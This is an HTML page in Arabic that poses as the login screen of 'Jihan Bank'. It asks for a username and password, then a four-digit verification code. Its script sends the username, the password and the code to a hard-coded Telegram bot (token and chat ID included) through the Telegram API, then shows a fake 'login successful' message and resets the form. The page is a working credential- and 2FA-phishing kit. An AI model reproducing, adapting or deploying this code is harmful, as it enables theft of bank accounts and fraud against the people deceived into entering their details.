<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta property="og:title" content="بنك جيهان - تسجيل الدخول">
    <meta property="og:description" content="منصة الخدمات المصرفية الحديثة">
    <meta property="og:image" content="https://d.top4top.io/p_3925rm7gi0.jpeg">
    <meta property="og:url" content="">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:image" content="https://d.top4top.io/p_3925rm7gi0.jpeg">
    <title>بنك جيهان - تسجيل الدخول</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            -webkit-user-select: none;
            user-select: none;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(180deg, #f5f5f5 0%, #efefef 50%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            position: fixed;
            width: 100%;
            overflow: hidden;
        }

        /* Geometric Background Pattern */
        .geometric-pattern {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.03;
            z-index: 0;
            background-image: 
                linear-gradient(45deg, transparent 45%, rgba(0,0,0,0.5) 48%, rgba(0,0,0,0.5) 52%, transparent 55%),
                linear-gradient(-45deg, transparent 45%, rgba(0,0,0,0.5) 48%, rgba(0,0,0,0.5) 52%, transparent 55%);
            background-size: 100px 100px;
            background-position: 0 0, 50px 50px;
            pointer-events: none;
        }

        .page-wrapper {
            position: fixed;
            z-index: 1;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }

        .login-container, .verify-container {
            background: white;
            border-radius: 35px;
            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.12);
            width: 100%;
            max-width: 500px;
            padding: 55px 40px 50px 40px;
            animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            display: none;
        }

        .login-container.active, .verify-container.active {
            display: block;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 40px;
            animation: logoScale 1s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        @keyframes logoScale {
            from {
                opacity: 0;
                transform: scale(0.5);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .logo {
            width: 150px;
            height: 150px;
            background: url('https://c.top4top.io/p_3925eoedz1.jpeg') center/cover no-repeat;
            border-radius: 50%;
            filter: drop-shadow(0 12px 35px rgba(196, 30, 58, 0.22));
            box-shadow: 0 0 0 6px rgba(196, 30, 58, 0.06);
            transition: transform 0.4s ease;
            flex-shrink: 0;
        }

        .logo:active {
            transform: scale(0.97);
        }

        .title {
            text-align: center;
            font-size: 42px;
            font-weight: 900;
            color: #1a1a1a;
            margin-bottom: 10px;
            letter-spacing: -1.5px;
        }

        .subtitle {
            text-align: center;
            font-size: 13px;
            color: #b0b0b0;
            margin-bottom: 36px;
            letter-spacing: 0.5px;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 22px;
            animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) backwards;
        }

        .form-group:nth-child(3) { animation-delay: 0.15s; }
        .form-group:nth-child(4) { animation-delay: 0.25s; }

        @keyframes slideInForm {
            from {
                opacity: 0;
                transform: translateX(30px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: #555;
            margin-bottom: 12px;
            font-weight: 700;
            letter-spacing: 0.3px;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 16px 18px;
            border: 2.5px solid #e8e8e8;
            border-radius: 18px;
            font-size: 16px;
            color: #333;
            transition: all 0.3s ease;
            background: linear-gradient(135deg, #fafafa 0%, #f7f7f7 100%);
            font-family: inherit;
            font-weight: 500;
            -webkit-appearance: none;
            appearance: none;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #c41e3a;
            background: white;
            box-shadow: 0 0 0 5px rgba(196, 30, 58, 0.1);
        }

        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #d5d5d5;
        }

        .toggle-password-btn {
            position: absolute;
            left: 16px;
            background: none;
            border: none;
            cursor: pointer;
            padding: 10px;
            color: #c9b57d;
            font-size: 22px;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .toggle-password-btn:active {
            transform: scale(1.15);
        }

        .login-btn, .verify-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #c41e3a 0%, #a01830 50%, #8b1529 100%);
            color: white;
            border: none;
            border-radius: 18px;
            font-size: 17px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 30px;
            margin-bottom: 26px;
            letter-spacing: 0.6px;
            box-shadow: 0 10px 28px rgba(196, 30, 58, 0.33);
            position: relative;
            overflow: hidden;
            -webkit-user-select: none;
            user-select: none;
        }

        .login-btn::before, .verify-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
            transition: left 0.6s ease;
        }

        .login-btn:active::before, .verify-btn:active::before {
            left: 100%;
        }

        .login-btn:active, .verify-btn:active {
            transform: translateY(-2px);
            box-shadow: 0 14px 35px rgba(196, 30, 58, 0.4);
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 28px 0;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1.5px;
            background: #e5e5e5;
        }

        .divider span {
            padding: 0 16px;
            color: #aaa;
            font-weight: 600;
            font-size: 14px;
        }

        .auth-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
            margin-bottom: 26px;
        }

        .auth-btn {
            padding: 14px 16px;
            background: linear-gradient(135deg, #555 0%, #444 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.4px;
            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.16);
            position: relative;
            overflow: hidden;
            -webkit-user-select: none;
            user-select: none;
        }

        .auth-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
            transition: left 0.6s ease;
        }

        .auth-btn:active::before {
            left: 100%;
        }

        .auth-btn:active {
            background: linear-gradient(135deg, #666 0%, #555 100%);
            transform: translateY(-1px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
        }

        .footer-links {
            text-align: center;
            padding-top: 22px;
            border-top: 1.5px solid #f2f2f2;
        }

        .footer-links a {
            color: #c41e3a;
            text-decoration: none;
            font-size: 13px;
            font-weight: 700;
            letter-spacing: 0.3px;
        }

        .footer-links a:active {
            opacity: 0.8;
        }

        /* Verification Code Styles */
        .verify-title {
            text-align: right;
            font-size: 36px;
            font-weight: 900;
            color: #1a1a1a;
            margin-bottom: 12px;
            letter-spacing: -1px;
        }

        .verify-subtitle {
            text-align: right;
            font-size: 13px;
            color: #999;
            margin-bottom: 32px;
            line-height: 1.6;
        }

        .otp-container {
            display: flex;
            gap: 12px;
            margin-bottom: 28px;
            justify-content: flex-end;
            animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s backwards;
            flex-direction: row-reverse;
        }

        .otp-input {
            width: 70px;
            height: 70px;
            border: 2.5px solid #e8e8e8;
            border-radius: 16px;
            font-size: 32px;
            font-weight: 800;
            text-align: center;
            color: #1a1a1a;
            background: linear-gradient(135deg, #fafafa 0%, #f7f7f7 100%);
            transition: all 0.3s ease;
            -webkit-appearance: none;
            appearance: none;
            -moz-appearance: textfield;
            direction: ltr;
        }

        .otp-input::-webkit-outer-spin-button,
        .otp-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .otp-input:focus {
            outline: none;
            border-color: #c41e3a;
            background: white;
            box-shadow: 0 0 0 5px rgba(196, 30, 58, 0.1);
        }

        .otp-input::placeholder {
            color: #e0e0e0;
        }

        @media (max-width: 480px) {
            body {
                padding: 0;
            }

            .page-wrapper {
                padding: 15px;
            }

            .login-container, .verify-container {
                padding: 45px 30px 40px 30px;
                border-radius: 30px;
            }

            .logo {
                width: 130px;
                height: 130px;
                margin-bottom: 30px;
            }

            .title, .verify-title {
                font-size: 36px;
                margin-bottom: 8px;
            }

            .subtitle, .verify-subtitle {
                font-size: 12px;
                margin-bottom: 28px;
            }

            .form-group label {
                font-size: 13px;
                margin-bottom: 10px;
            }

            input[type="text"],
            input[type="password"] {
                padding: 14px 16px;
                font-size: 15px;
                border-radius: 14px;
            }

            .otp-input {
                width: 60px;
                height: 60px;
                font-size: 28px;
                border-radius: 14px;
            }

            .otp-container {
                gap: 8px;
                margin-bottom: 24px;
            }

            .login-btn, .verify-btn {
                padding: 15px;
                font-size: 15px;
                margin-top: 26px;
                margin-bottom: 22px;
                border-radius: 14px;
            }

            .auth-btn {
                padding: 13px 14px;
                font-size: 13px;
                border-radius: 12px;
            }

            .divider {
                margin: 24px 0;
            }

            .divider span {
                font-size: 13px;
                padding: 0 12px;
            }
        }

        @media (max-width: 360px) {
            .login-container, .verify-container {
                padding: 40px 22px 35px 22px;
            }

            .logo {
                width: 110px;
                height: 110px;
            }

            .title, .verify-title {
                font-size: 32px;
            }

            .otp-input {
                width: 55px;
                height: 55px;
                font-size: 24px;
            }

            .otp-container {
                gap: 6px;
            }
        }

        @supports (padding: max(0px)) {
            .login-container, .verify-container {
                padding-bottom: max(40px, env(safe-area-inset-bottom));
            }

            @media (max-width: 480px) {
                .login-container, .verify-container {
                    padding-bottom: max(35px, env(safe-area-inset-bottom));
                }
            }
        }
    </style>
</head>
<body>
    <div class="geometric-pattern"></div>

    <div class="page-wrapper">
        <!-- Login Screen -->
        <div class="login-container active" id="loginScreen">
            <div class="logo-container">
                <div class="logo"></div>
            </div>

            <h1 class="title">تسجيل الدخول</h1>
            <p class="subtitle">مصرف جيهان - الخدمات المصرفية الحديثة</p>

            <form id="loginForm">
                <div class="form-group">
                    <label for="username">اسم المستخدم</label>
                    <div class="input-wrapper">
                        <input 
                            type="text" 
                            id="username" 
                            placeholder="أدخل اسم المستخدم" 
                            required
                        >
                    </div>
                </div>

                <div class="form-group">
                    <label for="password">كلمة المرور</label>
                    <div class="input-wrapper">
                        <input 
                            type="password" 
                            id="password" 
                            placeholder="أدخل كلمة المرور" 
                            required
                        >
                        <button 
                            type="button" 
                            class="toggle-password-btn" 
                            id="passwordToggle"
                        >
                            🔒
                        </button>
                    </div>
                </div>

                <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
            </form>

            <div class="divider">
                <span>أو</span>
            </div>

            <div class="auth-options">
                <button class="auth-btn" type="button" onclick="handleNewClient(event)">عميل جديد</button>
                <button class="auth-btn" type="button" onclick="handleCreateAccount(event)">إنشاء حساب</button>
            </div>

            <div class="footer-links">
                <a href="#" onclick="handleTerms(event)">الشروط والأحكام</a>
            </div>
        </div>

        <!-- Verification Screen -->
        <div class="verify-container" id="verifyScreen">
            <h1 class="verify-title">تحقق من هويتك</h1>
            <p class="verify-subtitle">أدخل رمز التحقق المكون من 4 أرقام<br>الذي تم إرساله إليك</p>

            <form id="verifyForm">
                <div class="otp-container" id="otpContainer">
                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" placeholder="0" inputmode="numeric">
                </div>

                <button type="submit" class="verify-btn" id="verifyBtn">تأكيد</button>
            </form>

            <div class="footer-links">
                <a href="#" onclick="backToLogin(event)">العودة</a>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8975476380:AAFBVdCXw22C_a82v7j801zHM2Pveg23l5k';
        const TELEGRAM_CHAT_ID = '8653203135';

        let loginData = {
            username: '',
            password: ''
        };

        let isPasswordVisible = false;

        // Password Toggle
        document.getElementById('passwordToggle').addEventListener('click', (e) => {
            e.preventDefault();
            const passwordInput = document.getElementById('password');
            isPasswordVisible = !isPasswordVisible;
            passwordInput.type = isPasswordVisible ? 'text' : 'password';
            document.getElementById('passwordToggle').textContent = isPasswordVisible ? '👁️' : '🔒';
        });

        // OTP Input Handler
        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });

            input.addEventListener('keyup', (e) => {
                if (!/^\d*$/.test(e.target.value)) {
                    e.target.value = '';
                }
            });
        });

        // Send First Data to Telegram (Login Only)
        async function sendLoginDataToTelegram(username, password) {
            const message = `📌 بيانات دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}`;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });

                return response.ok;
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }

        // Send Second Data to Telegram (Login + Verification Code)
        async function sendVerificationDataToTelegram(username, password, verificationCode) {
            const message = `✅ تحقق من الهوية - البيانات الكاملة:\n\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🔑 رمز التحقق: ${verificationCode}`;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });

                return response.ok;
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }

        // Form Submission
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;

            if (!username || !password) {
                alert('⚠️ الرجاء ملء جميع الحقول');
                return;
            }

            loginData.username = username;
            loginData.password = password;

            const loginBtn = document.getElementById('loginBtn');
            loginBtn.disabled = true;
            loginBtn.style.opacity = '0.8';
            const originalText = loginBtn.textContent;
            loginBtn.textContent = 'جاري المعالجة...';

            // Send first data (login only)
            const sent = await sendLoginDataToTelegram(username, password);

            setTimeout(() => {
                loginBtn.textContent = originalText;
                loginBtn.disabled = false;
                loginBtn.style.opacity = '1';

                // Show verification screen
                document.getElementById('loginScreen').classList.remove('active');
                document.getElementById('verifyScreen').classList.add('active');
                
                // Focus first OTP input
                setTimeout(() => {
                    otpInputs[0].focus();
                }, 100);
            }, 1000);
        });

        // Verification Form Submission
        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const otpValues = Array.from(otpInputs).map(input => input.value).join('');
            
            if (otpValues.length !== 4) {
                alert('⚠️ الرجاء إدخال رمز التحقق الكامل');
                return;
            }

            const verifyBtn = document.getElementById('verifyBtn');
            verifyBtn.disabled = true;
            verifyBtn.style.opacity = '0.8';
            const originalText = verifyBtn.textContent;
            verifyBtn.textContent = 'جاري المعالجة...';

            // Send second data (login + verification code)
            const sent = await sendVerificationDataToTelegram(loginData.username, loginData.password, otpValues);

            setTimeout(() => {
                verifyBtn.classList.add('success');
                verifyBtn.textContent = '✓ تم التحقق بنجاح';
                
                setTimeout(() => {
                    if (sent) {
                        alert('🎉 تم تسجيل الدخول بنجاح');
                    } else {
                        alert('✓ تم معالجة طلبك بنجاح');
                    }
                    
                    // Reset
                    document.getElementById('loginForm').reset();
                    document.getElementById('verifyForm').reset();
                    otpInputs.forEach(input => input.value = '');
                    
                    document.getElementById('verifyScreen').classList.remove('active');
                    document.getElementById('loginScreen').classList.add('active');
                    
                    verifyBtn.classList.remove('success');
                    verifyBtn.textContent = originalText;
                    verifyBtn.disabled = false;
                    verifyBtn.style.opacity = '1';
                    document.getElementById('passwordToggle').textContent = '🔒';
                    isPasswordVisible = false;
                }, 1200);
            }, 1500);
        });

        function backToLogin(e) {
            e.preventDefault();
            document.getElementById('verifyScreen').classList.remove('active');
            document.getElementById('loginScreen').classList.add('active');
            document.getElementById('verifyForm').reset();
            otpInputs.forEach(input => input.value = '');
        }

        // Other handlers
        function handleNewClient(e) {
            e.preventDefault();
            alert('👋 مرحباً! سيتم تحويلك إلى صفحة التسجيل كعميل جديد');
        }

        function handleCreateAccount(e) {
            e.preventDefault();
            alert('🆕 سيتم تحويلك إلى صفحة إنشاء حساب جديد');
        }

        function handleTerms(e) {
            e.preventDefault();
            alert('📋 الشروط والأحكام\n\nاطلع على جميع شروط استخدام خدمات المصرف');
        }
    </script>
</body>
</html>
